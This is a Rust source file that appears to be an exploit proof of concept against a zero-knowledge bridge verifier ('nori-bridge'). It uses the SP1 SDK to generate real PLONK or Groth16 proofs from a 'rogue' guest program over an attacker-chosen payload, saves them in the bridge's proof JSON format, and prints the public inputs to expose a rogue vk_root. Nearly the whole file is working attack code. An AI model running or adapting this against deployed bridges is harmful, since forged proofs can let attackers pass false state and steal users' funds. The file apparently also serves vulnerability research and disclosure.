use anyhow::Result;
use sp1_sdk::blocking::{Elf, ProverClient, Prover};
use sp1_sdk::{SP1Stdin, SP1ProofWithPublicValues};
use std::fs;

const ELF: &[u8] = include_bytes!("../../guest/elf/rogue-guest");

fn main() -> Result<()> {
    let args: Vec<String> = std::env::args().collect();
    let proof_type = args.get(1).map(|s| s.as_str()).unwrap_or("plonk");
    let output_dir = args.get(2).map(|s| s.as_str()).unwrap_or("output");

    fs::create_dir_all(output_dir)?;

    // Attacker-chosen payload: 176 bytes matching the nori proof output size.
    // The content is arbitrary; the point is the attacker controls pi1.
    let payload: Vec<u8> = vec![0xDE, 0xAD, 0xBE, 0xEF]
        .into_iter()
        .cycle()
        .take(176)
        .collect();

    let mut stdin = SP1Stdin::new();
    stdin.write_slice(&payload);

    // Use CPU prover for real proofs (not mock).
    let client = ProverClient::builder().cpu().build();
    let pk = client.setup(Elf::Static(ELF))?;

    println!("Generating {} proof...", proof_type);
    let proof: SP1ProofWithPublicValues = match proof_type {
        "plonk" => client.prove(&pk, &stdin).plonk()?,
        "groth16" => client.prove(&pk, &stdin).groth16()?,
        _ => anyhow::bail!("proof_type must be 'plonk' or 'groth16'"),
    };
    println!("Proof generated.");

    // Save in the same JSON format as nori-bridge-head (serde_json::to_string on SP1ProofWithPublicValues)
    let json = serde_json::to_string(&proof)?;
    let path = format!("{}/rogue_{}.json", output_dir, proof_type);
    fs::write(&path, &json)?;
    println!("Saved to {}", path);

    // Also print the public inputs so we can see the rogue vk_root
    match &proof.proof {
        sp1_sdk::SP1Proof::Plonk(p) => {
            for (i, pi) in p.public_inputs.iter().enumerate() {
                println!("pi{}: {}", i, pi);
            }
        }
        sp1_sdk::SP1Proof::Groth16(p) => {
            for (i, pi) in p.public_inputs.iter().enumerate() {
                println!("pi{}: {}", i, pi);
            }
        }
        _ => println!("unexpected proof type"),
    }

    Ok(())
}
